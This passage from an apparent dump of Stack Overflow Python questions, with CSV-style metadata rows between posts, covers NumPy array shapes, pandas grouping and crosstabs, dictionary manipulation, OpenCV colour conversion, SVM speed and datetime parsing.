Numpy functions can take arguments in different shapes. For instance, np.sum(V) can take either of two below and return outputs with different shapes.</p>

<pre><code>x1= np.array( [1,3] ) #(1)
x2= np.array([[[1,2],[3,4]], [[5,6],[7,8]]]) #(2)
</code></pre>

<p>I am making my own function something like below, which adds two values in an 1D vector with the length of two and return the real number.</p>

<pre><code>def foo(V):
    return V[0]+V[1];
</code></pre>

<p>However, this foo function can only take one 1D vector and cannot take any other shapes. It can only take x1 above as an argument but not x2. If I want to make my function work with either of two variables above(x1 and x2), or with any other shapes that has arrays with the length of 2 in their last dimension, how should I revise my foo function?</p>

<hr>

<p>---------------------------update------------------------------</p>

<p>My original function was a hardcoded negative gaussian pdf function.</p>

<pre><code>def nGauss(X, mu, cov):
    # multivariate negative gaussian.    
    # mu is a vector and cov is a covariance matrix.

    k = X.shape[0];
    dev = X-mu
    p1 = np.power( np.power(np.pi * 2, k) , -0.5);
    p2 = np.power( np.linalg.det(cov)  , -0.5)
    p3 = np.exp( -0.5 * np.dot( np.dot(dev.transpose(), np.linalg.inv(cov)), dev));

    return -1.0 * p1 * p2 * p3;
</code></pre>

<p>Now his function can return only one pdf value. For example, it can only take arguments like np.array([1,2]), but cannot take arguments X like np.array([[[1,2], [5,6]], [[7,8],[9,0]]]). Here my question was how to make my gaussian function takes arguments of arbitrary shapes and return the pdf value of each point maintaining the same structure except the last dimension, such as
<code>nGauss(np.array( [1,2] ), mu, cov)</code> returns [ 0.000023 ], and 
<code>nGauss(np.array([[[1,2], [5,6]], [[7,8],[9,0]]]), mu, cov)</code> returns [[ 0.000023, 0000014], [0.000012, 0.000042]].</p>

<p>I notice that scipy function 'multivariate_normal.pdf' can do this.</p>

<hr>

<p>Q2)
I am also having a difficulty in understanding np's basic array.</p>

<pre><code>t1=np.array([[1,2,3], [4,5,6]])
t2=np.array([1,2,3])
t3=np.array([[1,2,3], [4,5,6],5])
</code></pre>

<p>The shape of t1 is (2,3), and it seems legitimate in terms of matrix perspective; 2 rows and 3 columns. However, the shape of t2 is (3,), which I think has to be (3). What's the meaning of the empty space after ""3,""? Also, the shape of t3 is (3,). In this case, is the meaning of the empty space that dimensions vary? </p>

<p>In advance, thanks for your help.</p>
"
39987877,6756884.0,2016-10-11 22:40:20+00:00,3,Count duplicates in list and assign the sum into list,"<p>I have a list with duplicate strings:</p>

<pre><code>lst = [""abc"", ""abc"", ""omg"", ""what"", ""abc"", ""omg""]
</code></pre>

<p>and I would like to produce:</p>

<pre><code>lst = [""3 abc"", ""2 omg"", ""what""]
</code></pre>

<p>so basically count duplicates, remove duplicates and add the sum to the beginning of the string.</p>

<p>This is how I do it right now:</p>

<pre><code>from collections import Counter
list2=[]
for i in lst:
  y = dict(Counter(i))
  have = list(accumulate(y.items())) # creating [(""omg"", 3), ...]

  for tpl in have: #
    join_list = []
    if tpl[1] &gt; 1:
      join_list.append(str(tpl[1])+"" ""+tpl[0])
    else:
      join_list.append(tpl[0])
  list2.append(', '.join(join_list))
</code></pre>

<p>Is there a easier way to obtain the desired result in python?</p>
"
39987860,5522848.0,2016-10-11 22:38:13+00:00,3,Update Pandas Cells based on Column Values and Other Columns,"<p>I am looking to update many columns based on the values in one column; this is easy with a loop but takes far too long for my application when there are many columns and many rows. What is the most elegant way to get the desired counts for each letter?</p>

<p>Desired Output:</p>

<pre><code>   Things         count_A     count_B    count_C     count_D
['A','B','C']         1            1         1          0
['A','A','A']         3            0         0          0
['B','A']             1            1         0          0
['D','D']             0            0         0          2
</code></pre>
"
39607540,6777053.0,2016-09-21 04:25:44+00:00,3,Count the number of Occurrence of Values based on another column,"<p>I have a question regarding creating pandas dataframe according to the sum of other column.</p>

<p>For example, I have this dataframe</p>

<pre><code> Country    |    Accident
 England           Car
 England           Car
 England           Car
  USA              Car
  USA              Bike
  USA              Plane
 Germany           Car
 Thailand          Plane
</code></pre>

<p>I want to make another dataframe based on the sum value of all accident  based on the country. We will disregard the type of the accident, while summing them all based on the country.</p>

<p>My desire dataframe would look like this</p>

<pre><code>  Country    |    Sum of Accidents
  England              3
    USA                3
  Germany              1
  Thailand             1
</code></pre>
"
39987708,6095474.0,2016-10-11 22:23:24+00:00,3,Python - Convert dictionary into list with length based on values,"<p>I have a dictionary</p>

<pre><code>d = {1: 3, 5: 6, 10: 2}
</code></pre>

<p>I want to convert it to a list that holds the keys of the dictionary. Each key should be repeated as many times as its associated value.</p>

<p>I've written this code that does the job:</p>

<pre><code>d = {1: 3, 5: 6, 10: 2}
l = []
for i in d:
    for j in range(d[i]):
        l.append(i)
l.sort()
print(l)
</code></pre>

<p>Output:</p>

<pre><code>[1, 1, 1, 5, 5, 5, 5, 5, 5, 10, 10]
</code></pre>

<p>But I would like it to be a list comprehension. How can this be done?</p>
"
39735068,1700890.0,2016-09-27 22:05:10+00:00,3,"Pandas crosstab, but with values from aggregation of third column","<p>Here is my problem:</p>

<pre><code>df = pd.DataFrame({'A': ['one', 'one', 'two', 'two', 'one'] ,
                   'B': ['Ar', 'Br', 'Cr', 'Ar','Ar'] ,
                   'C': [1, 0, 0, 1,0 ]})
</code></pre>

<p>I would like to generate something like output of <code>pd.crosstab</code> function, but values on the intersection of column and row should come from aggregation of third column:</p>

<pre><code>    Ar,  Br, Cr
one 0.5 0  0
two 1  0  0
</code></pre>

<p>For example, there are two cases of 'one' and 'Ar' corresponding values in column 'C' are 1,0 we sum up values in column 'C' (0+1) and divide by number of values   in column 'C', so we get (0+1)/2 =0.5. Whenever combination is not present we (like 'Cr' and 'one') we set it to zero. Any thoughts?</p>
"
39787787,2179021.0,2016-09-30 09:08:25+00:00,3,How to get the difference between two 24 hour times?,"<p>Is there a simple way in pandas to tell the difference between 24 hour times as follows:</p>

<pre><code>9:45 17:10
</code></pre>

<p>The difference is 7 hours and 25 minutes which is 445 minutes.</p>
"
40035276,5679881.0,2016-10-14 05:05:40+00:00,3,Adding arrays to dataframe column,"<p>Let's assume I have this dataframe <code>df</code>:</p>

<pre><code>   'Location'  'Rec ID'  'Duration'
0     Houston       126          17
1     Chicago       338        19.3
</code></pre>

<p>I would like to add a column with arrays corresponding to my recordings like:</p>

<pre><code>   'Location'  'Rec ID'  'Duration'                           'Rec'
0     Houston       126          17    [0.2, 0.34, 0.45, ..., 0.28]
1     Chicago       338        19.3    [0.12, 0.3, 0.41, ..., 0.39]
</code></pre>

<p>When I do the <code>df.set_value()</code> command I get the following error:</p>

<p><strong><em>ValueError: setting an array element with a sequence.</em></strong></p>
"
39735676,1949548.0,2016-09-27 23:08:17+00:00,3,Binarize a float64 Pandas Dataframe in Python,"<p>I've got a Panda DF with various columns (each indicating the frequency of a word in a corpus). Each row corresponds to a document and each is of type float64. </p>

<p>for example:</p>

<pre><code>word1 word2 word3
0.0   0.3   1.0
0.1   0.0   0.5
etc
</code></pre>

<p>I want to Binarize this and instead of the frequency end up with a boolean (0s and 1s DF) that indicates the existence of a word</p>

<p>so the above example would be transformed to :</p>

<pre><code>word1 word2 word3
0      1     1
1      0     1
etc
</code></pre>

<p>I looked at get_dummies(), but the output was not the expected.</p>
"
39787103,4115378.0,2016-09-30 08:35:19+00:00,3,Indexing by datetime pandas dataframe fail,"<p>I have the following dataframe <code>df</code>:</p>

<pre><code>                          Candy       Apple      Banana
2016-09-14 19:00:00  109.202060  121.194138  130.372082
2016-09-14 20:00:00  109.199083  121.188817  130.380736
2016-09-14 21:00:00  109.198894  121.180553  130.366054
2016-09-14 22:00:00  109.192076  121.148722  130.307342
2016-09-14 23:00:00  109.184374  121.131068  130.276691
2016-09-15 00:00:00  109.191582  121.159304  130.316872
2016-09-15 01:00:00  109.183895  121.133062  130.269966
2016-09-15 02:00:00  109.193550  121.174708  130.337563
2016-09-15 03:00:00  109.196597  121.153076  130.274463
2016-09-15 04:00:00  109.195608  121.168936  130.276042
2016-09-15 05:00:00  109.211957  121.208946  130.330430
2016-09-15 06:00:00  109.210598  121.214454  130.365404
2016-09-15 07:00:00  109.224667  121.285534  130.508604
2016-09-15 08:00:00  109.220784  121.248828  130.389024
2016-09-15 09:00:00  109.199448  121.155439  130.212834
2016-09-15 10:00:00  109.226648  121.276439  130.427642
2016-09-15 11:00:00  109.239957  121.311719  130.462447
</code></pre>

<p>I want to create a second dataframe with just data from the past 6 hours. </p>

<pre><code>df.index = pd.to_datetime(df.index,infer_datetime_format=True)

last_row = df.tail(1).index

six_hour = last_row - timedelta(hours=6)

df_6hr = df.loc[six_hour:last_row]
print df_6hr
</code></pre>

<p>I get the following error:</p>

<blockquote>
  <p>File ""pandas/tslib.pyx"", line 298, in pandas.tslib.Timestamp.<strong>new</strong>
  (pandas/tslib.c:9013)<br>
  File ""pandas/tslib.pyx"", line 1330, in
  pandas.tslib.convert_to_tsobject (pandas/tslib.c:25826)</p>
  
  <p>TypeError: Cannot convert input to Timestamp</p>
</blockquote>

<p>How come it doesn't work?</p>
"
40049802,1700890.0,2016-10-14 18:25:53+00:00,3,Pandas - operations on groups using transform,"<p>Here is my example:</p>

<pre><code>import pandas as pd
import numpy as np

df = pd.DataFrame({'A A': ['one', 'one', 'two', 'two', 'one'] ,
                   'B': ['Ar', 'Br', 'Cr', 'Ar','Ar'] ,
                   'C': ['12/15/2011', '11/11/2001', '08/30/2015', '07/3/1999','03/03/2000' ],
                      'D':[1,7,3,4,5]})

df['C'] = pd.to_datetime(df['C'])

def date_test(x):
    key_date = pd.Timestamp(np.datetime64('2015-08-13'))
    end_date = pd.Timestamp(np.datetime64('2016-10-10'))
    result = False

    for i in x.index:
        if key_date &lt; x[i] &lt; end_date:
            result = True

    return result

def int_test(x):
    result = False
    for i in x.index:
        if 1 &lt; x[i] &lt; 9:
            result = True

    return result
</code></pre>

<p>Now I am grouping by column <code>B</code> and transforming column <code>C</code> and <code>D</code></p>

<p>The following code producess column of ones. </p>

<pre><code>df.groupby(['B'])['D'].transform(int_test)
</code></pre>

<p>And the following code produces column of dates</p>

<pre><code>df.groupby(['B'])['C'].transform(date_test)
</code></pre>

<p>I would expect them both to produce collection of ones and zeros and not dates. My goal is to get collection of ones and zeros. Any thoughts?</p>

<p><strong>Update</strong>: My main goal is to understand how <code>transform</code> works. </p>
"
40034950,5524047.0,2016-10-14 04:30:43+00:00,3,How to make replacement in python's dict?,"<p>The goal I want to achieve is to exchange all items whose form is <code>#item_name#</code> to the from <code>(item_value)</code> in the dict. I use two <code>dict</code> named <code>test1</code> and <code>test2</code> to test my function. Here is the code:</p>

<pre><code>test1={'integer_set': '{#integer_list#?}', 'integer_list': '#integer_range#(?,#integer_range#)*', 'integer_range': '#integer#(..#integer#)?', 'integer': '[+-]?\\d+'}
test2={'b': '#a#', 'f': '#e#', 'c': '#b#', 'e': '#d#', 'd': '#c#', 'g': '#f#', 'a': 'correct'}
def change(pat_dict:{str:str}):
    print('Expanding: ',pat_dict)
    num=0
    while num&lt;len(pat_dict):
        inv_pat_dict = {v: k for k, v in pat_dict.items()}
        for value in pat_dict.values():
            for key in pat_dict.keys():
                if key in value:
                    repl='#'+key+'#'
                    repl2='('+pat_dict[key]+')'
                    value0=value.replace(repl,repl2)
                    pat_dict[inv_pat_dict[value]]=value0 
        num+=1
    print('Result: ',pat_dict)    

change(test1)
change(test2)
</code></pre>

<p>sometimes I can get correct result like:</p>

<pre><code>Expanding:  {'integer': '[+-]?\\d+', 'integer_list': '#integer_range#(?,#integer_range#)*', 'integer_set': '{#integer_list#?}', 'integer_range': '#integer#(..#integer#)?'}
Result:  {'integer': '[+-]?\\d+', 'integer_list': '(([+-]?\\d+)(..([+-]?\\d+))?)(?,(([+-]?\\d+)(..([+-]?\\d+))?))*', 'integer_set': '{((([+-]?\\d+)(..([+-]?\\d+))?)(?,(([+-]?\\d+)(..([+-]?\\d+))?))*)?}', 'integer_range': '([+-]?\\d+)(..([+-]?\\d+))?'}
Expanding:  {'c': '#b#', 'f': '#e#', 'e': '#d#', 'b': '#a#', 'g': '#f#', 'd': '#c#', 'a': 'correct'}
Result:  {'c': '((correct))', 'f': '(((((correct)))))', 'e': '((((correct))))', 'b': '(correct)', 'g': '((((((correct))))))', 'd': '(((correct)))', 'a': 'correct'}
</code></pre>

<p>But most of time I get wrong results like that:</p>

<pre><code>Expanding:  {'integer_range': '#integer#(..#integer#)?', 'integer': '[+-]?\\d+', 'integer_set': '{#integer_list#?}', 'integer_list': '#integer_range#(?,#integer_range#)*'}
Result:  {'integer_range': '([+-]?\\d+)(..([+-]?\\d+))?', 'integer': '[+-]?\\d+', 'integer_set': '{(#integer_range#(?,#integer_range#)*)?}', 'integer_list': '#integer_range#(?,#integer_range#)*'}
Expanding:  {'f': '#e#', 'a': 'correct', 'd': '#c#', 'g': '#f#', 'b': '#a#', 'c': '#b#', 'e': '#d#'}
Result:  {'f': '(((((correct)))))', 'a': 'correct', 'd': '(((correct)))', 'g': '((((((correct))))))', 'b': '(correct)', 'c': '((correct))', 'e': '((((correct))))'}
</code></pre>

<p>How could I update my code to achieve my goal?</p>
"
40097863,3271404.0,2016-10-18 00:54:53+00:00,3,How to remove the all the curly bracket in dictionary of dictionaries,"<p>I wish to remove all the curly brackets from my current output. My current output as shown below:</p>

<pre><code> {'Chin PTE LTD': {'Carrot Cake': 22, 'Chocolate Cake': 12, 'Beer': 89}, 'COQ 
SEAFOOD': {'GRILLED AUSTRALIA ANGU': 1, 'CRISPY CHICKEN WINGS': 1
}}
</code></pre>

<p>My current code as shown below:</p>

<pre><code>for merchant, product, quantity in big_list:
    d[merchant][product] += quantity

print ({ k:dict(v) for k,v in d.items() })
</code></pre>

<p>My desired output:</p>

<pre><code>'Chin PTE LTD': 'Carrot Cake': 22, 'Chocolate Cake': 12, 'Beer': 89, 'COQ 
    SEAFOOD': 'GRILLED AUSTRALIA ANGU': 1, 'CRISPY CHICKEN WINGS': 1
</code></pre>

<p>As I am still new to python, may I ask if i wish to remove the all the curly brackets in the dictionary of dictionaries. Would my desired output be achievable? If so, how should I go about doing it? Any suggestions / ideas would be appreciated. Thank you.</p>
"
40126403,461887.0,2016-10-19 08:47:17+00:00,3,Inplace functions in Python,"<p>In Python there is a concept of inplace functions. For example shuffle is inplace in that it returns none.</p>

<p>How do I determine if a function will be inplace or not?</p>

<pre><code>from random import shuffle

print(type(shuffle))

&lt;class 'method'&gt;
</code></pre>

<p>So I know it's a <code>method</code> from class <code>random</code> but is there a special variable that defines some functions as inplace?</p>
"
39735843,4062451.0,2016-09-27 23:31:25+00:00,3,Pycharm: Type hint list of items,"<p>My question is different because I made a mistake using type hint.</p>

<p>I found a weird type hinging in pycharm:
<a href=""http://i.stack.imgur.com/KFi0B.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/KFi0B.png"" alt=""enter image description here""></a></p>

<p><code>Example</code> is my own class. But I guess this is less important because the IDE is complaining about <code>list</code> type does not define <code>__getitem__</code> method which is no true. I'm wondering if it's a bug or I used it in a wrong way.</p>
"
40126683,1874897.0,2016-10-19 08:59:45+00:00,3,How to generate effectively a random number that only contains unique digits in Python?,"<pre><code>import random

def get_number(size):
  result = [random.randint(1,9)]
  digits = list(range(0,10))
  digits.remove(result[0])
  if(size &gt; 1):
    result += random.sample(digits,size-1)
  return ''.join(map(str,result))

print(get_number(4))
</code></pre>

<p>I solved the problem, but I feel that it's clumsy. 
How can I do this more effectively and more elegant? </p>
"
39749807,6223328.0,2016-09-28 14:02:02+00:00,3,"Optimize Python: Large arrays, memory problems","<p>I'm having a speed problem running a python / numypy code. I don't know how to make it faster, maybe someone else?</p>

<p>Assume there is a surface with two triangulation, one fine (..._fine) with M points, one coarse with N points. Also, there's data on the coarse mesh at every point (N floats). I'm trying to do the following:</p>

<p>For every point on the fine mesh, find the k closest points on coarse mesh and get mean value. Short: interpolate data from coarse to fine. </p>

<p>My code right now goes like that. With large data (in my case M = 2e6, N = 1e4) the code runs about 25 minutes, guess due to the explicit for loop not going into numpy. Any ideas how to solve that one with smart indexing? M x N arrays blowing the RAM..</p>

<pre><code>import numpy as np

p_fine.shape =&gt; m x 3
p.shape =&gt; n x 3

data_fine = np.empty((m,))
for i, ps in enumerate(p_fine):
    data_fine[i] = np.mean(data_coarse[np.argsort(np.linalg.norm(ps-p,axis=1))[:k]])
</code></pre>

<p>Cheers!</p>
"
40058686,4922653.0,2016-10-15 11:52:36+00:00,3,Different Color Result Between Python OpenCV and MATLAB,"<p>I'm going to convert RGB image to YIQ image and viceversa. The problem is Python give me a weird image, while MATLAB shows the right one. I spent hours to figure what's wrong, but i still have no idea.</p>

<p>I use Python 3.5.2 with OpenCV 3.1.0 and MATLAB R2016a.</p>

<p>Python code for RGB2YIQ:</p>

<pre><code>import cv2 as cv
import numpy as np

def rgb2yiq(img):
   row, col, ch = img.shape
   Y = np.zeros((row,col))
   I = np.zeros((row,col))
   Q = np.zeros((row,col))
   for i in range(row):
      for j in range(col):
         Y[i,j] = 0.299 * img[i,j,2] + 0.587 * img[i,j,1] + 0.114 * img[i,j,0]
         I[i,j] = 0.596 * img[i,j,2] - 0.274 * img[i,j,1] - 0.322 * img[i,j,0]
         Q[i,j] = 0.211 * img[i,j,2] - 0.523 * img[i,j,1] + 0.312 * img[i,j,0]
   yiq = cv.merge((Y,I,Q))
   return yiq.astype(np.uint8)

def main():
   img = cv.imread(""C:/Users/Kadek/Documents/MATLAB/peppers.jpg"")
   img = rgb2yiq(img)
   cv.imwrite(""YIQ.jpg"",img)
   cv.namedWindow('Image', cv.WINDOW_NORMAL)
   cv.imshow('Image', img)
   cv.waitKey(0)
   cv.destroyAllWindows()

main()
</code></pre>

<p>MATLAB code for RGB2YIQ:</p>

<pre><code>img = imread('peppers.jpg');
[row col ch] = size(img);

for x=1:row
  for y=1:col
      Y(x,y) = 0.299 * img(x,y,1) + 0.587 * img(x,y,2) + 0.114 * img(x,y,3);
      I(x,y) = 0.596 * img(x,y,1) - 0.274 * img(x,y,2) - 0.322 * img(x,y,3);
      Q(x,y) = 0.211 * img(x,y,1) - 0.523 * img(x,y,2) + 0.312 * img(x,y,3);
  end
end

yiq(:,:,1) = Y;
yiq(:,:,2) = I;
yiq(:,:,3) = Q;

figure, imshow(yiq);
</code></pre>

<p><a href=""http://image.prntscr.com/image/1d6348dcac804642a5a47f5a03d6da08.jpg"" rel=""nofollow"">Result for RGB2YIQ</a></p>

<p>Python code for YIQ2RGB:</p>

<pre><code>import cv2 as cv
import numpy as np

def yiq2rgb(img):
   row, col, ch = img.shape
   r = np.zeros((row,col))
   g = np.zeros((row,col))
   b = np.zeros((row,col))
   for i in range(row):
      for j in range(col):
         r[i,j] = img[i,j,0] * 1.0 + img[i,j,1] * 0.9562 + img[i,j,2] * 0.6214
         g[i,j] = img[i,j,0] * 1.0 - img[i,j,1] * 0.2727 - img[i,j,2] * 0.6468
         b[i,j] = img[i,j,0] * 1.0 - img[i,j,1] * 1.1037 + img[i,j,2] * 1.7006
   rgb = cv.merge((b,g,r))
   return rgb.astype(np.uint8)

def main():
   img = cv.imread(""YIQ.jpg"")
   img = yiq2rgb(img)
   cv.imwrite(""test.jpg"",img)
   cv.namedWindow('Image', cv.WINDOW_NORMAL)
   cv.imshow('Image', img)
   cv.waitKey(0)
   cv.destroyAllWindows()

main()
</code></pre>

<p>MATLAB code for YIQ2RGB:</p>

<pre><code>img = imread('YIQ.jpg');
[row col ch] = size(img);

for x=1:row
  for y=1:col
      R(x,y) = 1.0 * img(x,y,1) + 0.9562 * img(x,y,2) + 0.6214 * img(x,y,3);
      G(x,y) = 1.0 * img(x,y,1) - 0.2727 * img(x,y,2) - 0.6468 * img(x,y,3);
      B(x,y) = 1.0 * img(x,y,1) - 1.1037 * img(x,y,2) + 1.7006 * img(x,y,3);
  end
end

rgb(:,:,1) = R;
rgb(:,:,2) = G;
rgb(:,:,3) = B;

imwrite(rgb,'YIQ2RGB.jpg');

figure, imshow(rgb);
</code></pre>

<p><a href=""http://image.prntscr.com/image/3dfff94420c0426093162fad4451ad76.jpg"" rel=""nofollow"">Result for YIQ2RGB</a></p>

<p>Some said that i used to convert the image to float64 before manipulates it. Already tried that, but nothing changed.
I also used astype(np.uint8) to convert float64 to uint8 to avoid values outside [0..255]. In MATLAB there is no such problem.</p>
"
39669538,1196339.0,2016-09-23 21:05:12+00:00,3,Python mock call_args_list unpacking tuples for assertion on arguments,"<p>I'm having some trouble dealing with the nested tuple which <code>Mock.call_args_list</code> returns.</p>

<pre><code>def test_foo(self):
    def foo(fn):
        fn('PASS and some other stuff')

    f = Mock()
    foo(f)
    foo(f)
    foo(f)

    for call in f.call_args_list:
        for args in call:
            for arg in args:
                self.assertTrue(arg.startswith('PASS'))
</code></pre>

<p>I would like to know if there is a better way to unpack that call_args_list on the mock object in order to make my assertion. This loop works, but it feels like there must be a more straight forward way.</p>
"
39593275,2587904.0,2016-09-20 11:49:04+00:00,3,How to get data from R to pandas,"<p>In a jupiter notebook I created some 2-d-list in R like</p>

<pre><code>%%R
first &lt;- ""first""
second &lt;- ""second""

names(first) &lt;- ""first_thing""
names(second) &lt;- ""second_thing""

x &lt;- list()
index &lt;- length(x)+1
x[[index]] = first
x[[index +1]] = second
</code></pre>

<p>a <code>%Rpull x</code> does not return the nice representation but rather a <code>ListVector</code>. How can I convert it into something nicer e.g. a dict / pd.Dataframe? So far I had no luck following <a href=""http://pandas.pydata.org/pandas-docs/stable/r_interface.html"" rel=""nofollow"">http://pandas.pydata.org/pandas-docs/stable/r_interface.html</a>
<a href=""http://i.stack.imgur.com/2PBFh.jpg"" rel=""nofollow""><img src=""http://i.stack.imgur.com/2PBFh.jpg"" alt=""pull from R""></a></p>

<h1>edit</h1>

<p>The list I want to convert is a 2-d list like <code>results</code> the updated code snipped from above</p>
"
39637675,3411682.0,2016-09-22 11:23:13+00:00,3,What is the difference between @types.coroutine and @asyncio.coroutine decorators?,"<p>Documentations say:</p>

<blockquote>
  <p>@asyncio.coroutine</p>
  
  <p>Decorator to mark generator-based coroutines. This enables the generator use yield from to call async def coroutines, and also
  enables the generator to be called by async def coroutines, for
  instance using an await expression.</p>
</blockquote>

<p>_</p>

<blockquote>
  <p>@types.coroutine(gen_func) </p>
  
  <p>This function transforms a generator
  function into a coroutine function which returns a generator-based
  coroutine. The generator-based coroutine is still a generator
  iterator, but is also considered to be a coroutine object and is
  awaitable. However, it may not necessarily implement the <code>__await__()</code>
  method.</p>
</blockquote>

<p>So is seems like purposes is the same - to flag a generator as a coroutine (what <code>async def</code>in Python3.5 and higher does with some features).</p>

<p>When need to use <code>asyncio.coroutine</code> when need to use <code>types.coroutine</code>, what is the diffrence?</p>
"
39677462,3601754.0,2016-09-24 14:30:13+00:00,3,Filling holes in image with OpenCV or Skimage,"<p>I m trying to fill holes for a chessboard for stereo application. The chessboard is at micro scale thus it is complicated to avoid dust... as you can see :</p>

<p><a href=""http://i.stack.imgur.com/mCOFl.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/mCOFl.png"" alt=""enter image description here""></a></p>

<p>Thus, the corners detection is impossible. I tried with SciPy's binary_fill_holes or similar approaches but i have a full black image, i dont understand.</p>
"
39852896,761090.0,2016-10-04 12:53:59+00:00,3,Intensity-weighted minimal path between 2 points in grayscale image,"<p>I want to determine minimum path between two specific points in an image, i.e. the path for which sum of distances between adjacent pixels weighted by pixel intensity (greyscale) will be minimized. For instance, this picture shows the input image</p>

<p><a href=""http://i.stack.imgur.com/6hR24.jpg"" rel=""nofollow""><img src=""http://i.stack.imgur.com/6hR24.jpg"" alt=""original image""></a></p>

<p>and this is the (hand-drawn) minimal path in red, from UL to LR corner (black boundaries serve as zero-weight padding):</p>

<p><a href=""http://i.stack.imgur.com/6Y2Wb.jpg"" rel=""nofollow""><img src=""http://i.stack.imgur.com/6Y2Wb.jpg"" alt=""example minimum path""></a></p>

<p>I found that matlab has the <a href=""http://%20https://www.mathworks.com/help/images/ref/graydist.html"" rel=""nofollow"">graydist</a> function just for this; is there something similar in ndimage/scikit-image/whatever? I found <a href=""http://docs.scipy.org/doc/scipy-0.14.0/reference/generated/scipy.ndimage.morphology.distance_transform_edt.html#scipy.ndimage.morphology.distance_transform_edt"" rel=""nofollow"">scipy.ndimage.morphology.distance_transform_edt</a> but I am not sure if and how to use it for this purpose. It is OK if the algorithm returns only one of non-unique minima.</p>

<p>I am not interested in implementation hints, it is a fairly straightforward task algorithmically (at least the naive implementation using e.g. dynamic programming), I am looking for (combination of) already coded routines to accomplish this.</p>
"
40077432,6924269.0,2016-10-17 01:49:36+00:00,3,scikit-learn SVM.SVC() is extremely slow,"<p>i try to use the SVM classifier to train the data which is around 100k, but I find it is extremely slow and there is no any response when I run the code after 2 hr. when dataset is around 1k, i can get the result immediately, I also try the SGDClassifier and naÃ¯ve bayes which is quite fast and get result within couple of mins.</p>
"
39597405,6251706.0,2016-09-20 14:56:09+00:00,3,Numpy log slow for numbers close to 1?,"<p>Look at the following piece of code:</p>

<pre><code>import numpy as np
import timeit

print('close', timeit.Timer(lambda: np.log(0.99999999999999978)).timeit())
print('not close', timeit.Timer(lambda: np.log(0.99)).timeit()))
</code></pre>

<p>The output is:</p>

<pre><code>close 4.462684076999722
not close 0.6319260000018403
</code></pre>

<p>How come such big (orders of magnitude) difference in running time? Am I missing something?</p>

<p>EDIT:</p>

<p>More preceisly we see the slowdown for values as small as:
<code>1 - np.finfo(np.float).eps</code>
but not for values
<code>1 - np.finfo(np.float).eps * 10</code>.</p>

<p>My machine <code>Python 3.5.2 |Anaconda 4.1.1 (64-bit)</code> with <code>numpy 1.11.1</code>. </p>

<p>This has been so far reproduced on 3 other machines from my side (2 Python 3.4 Anaconda installations, 1 Python 2.7 default Ubuntu installation).</p>

<p>Some other users could also reproduce it, while others could not. See comments.</p>

<p>EDIT 2:</p>

<p>Possibly only reproducible on Linux systems. So far, not reproducible on Windows systems.</p>
"
39657330,4313321.0,2016-09-23 09:30:40+00:00,3,How to calculate the values of a pandas DataFrame column depending on the results of a rolling function from another column,"<p><br>A very simple example just for understanding.</p>

<p><strong>The goal is to calculate the values of a pandas DataFrame column depending on the results of a rolling function from another column.</strong></p>

<p>I have the following DataFrame:</p>

<pre><code>import numpy as np
import pandas as pd

s = pd.Series([1,2,3,2,1,2,3,2,1])    
df = pd.DataFrame({'DATA':s, 'POINTS':0})

df
</code></pre>

<p><a href=""http://i.stack.imgur.com/8dZmD.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/8dZmD.png"" alt=""DataFrame start""></a></p>

<p><em>Note: I don't even know how to format the Jupyter Notebook results in the Stackoverflow edit window, so I copy and paste the image, I beg your pardon.</em></p>

<p>The <strong>DATA</strong> column shows the observed data; the <strong>POINTS</strong> column, initialized to 0, is used to collect the output of a ""rolling"" function applied to DATA column, as explained in the following.</p>

<p>Set a window = 4</p>

<pre><code>nwin = 4
</code></pre>

<p>Just for the example, <strong>the ""rolling"" function calculate the max</strong>.</p>

<p>Now let me use a drawing to explain what I need.</p>

<p><a href=""http://i.stack.imgur.com/GflSG.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/GflSG.png"" alt=""Algo flow""></a></p>

<p>For every iteration, the rolling function calculate the maximum of the data in the window; then the POINT at the same index of the max DATA is incremented by 1.</p>

<p>The final result is:</p>

<p><a href=""http://i.stack.imgur.com/7P1Z5.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/7P1Z5.png"" alt=""DataFrame end""></a></p>

<p>Can you help me with the python code?</p>

<p>I really appreciate your help.<br>
Thank you in advance for your time,<br>
Gilberto</p>

<p><em>P.S. Can you also suggest how to copy and paste Jupyter Notebook formatted cell to Stackoverflow edit window? Thank you.</em></p>
"
39948237,1514983.0,2016-10-09 20:30:20+00:00,3,Does PyObject_CallObject steal reference to args? (do I need to free the memory?),"<p>The documentation for Python, is again just as the language, beautiful but lacking and sort of inefficient :) - <a href=""https://docs.python.org/3/c-api/object.html#c.PyObject_CallObject"" rel=""nofollow"">https://docs.python.org/3/c-api/object.html#c.PyObject_CallObject</a></p>

<p>I am calling <code>PyObject_CallObject</code> in my C code, and wonder if args that I created (<code>PyObject*</code>) need to be freed after the call, or if they are consumed by Python.</p>

<p>That means, in some cases, Python consumes the variable, meaning it will call <code>Py_DECREF</code> for you, and subsequential calls of <code>Py_DECREF</code> may have undocumented results.</p>

<p>In case it doesn't, I should call Py_DECREF otherwise it would leak. So question is: do I need to free the memory here or I don't? I would expect args to be consumed by call, but documentation doesn't say anything about it.</p>
"
39887880,1562165.0,2016-10-06 05:04:10+00:00,3,Can a python function know when it's being called by a list comprehension?,"<p>I want to make a python function that behaves differently when it's being called from a list comprehension:</p>

<pre><code>def f():
    # this function returns False when called normally,
    # and True when called from a list comprehension
    pass

&gt;&gt;&gt; f()
False
&gt;&gt;&gt; [f() for _ in range(3)]
[True, True, True]
</code></pre>

<p>I tried looking at the inspect module, the dis module, and lib2to3's parser for something to make this trick work, but haven't found anything. There also might be a simple reason why this cannot exist, that I haven't thought of.</p>
"
39648189,2693875.0,2016-09-22 20:19:52+00:00,3,Disable global installs using pip - allow only virtualenvs,"<p>Sometimes by mistake I install some packages globally with plain <code>pip install package</code> and contaminate my system instead of creating a proper virtualenv and keeping things tidy.</p>

<p>How can I easily disable global installs with <code>pip</code> at all? Or at least show big fat warning when using it this way to make sure that I know what am I doing?</p>
"
39853321,671391.0,2016-10-04 13:12:52+00:00,3,How to convert string date with timezone to datetime?,"<p>I have date in string:</p>

<pre><code>Tue Oct 04 2016 12:13:00 GMT+0200 (CEST)
</code></pre>

<p>and I use (according to <a href=""https://docs.python.org/2/library/datetime.html#strftime-strptime-behavior"" rel=""nofollow"">https://docs.python.org/2/library/datetime.html#strftime-strptime-behavior</a>):</p>

<pre><code>datetime.strptime(datetime_string, '%a %b %m %Y %H:%M:%S %z %Z')
</code></pre>

<p>but I get error:</p>

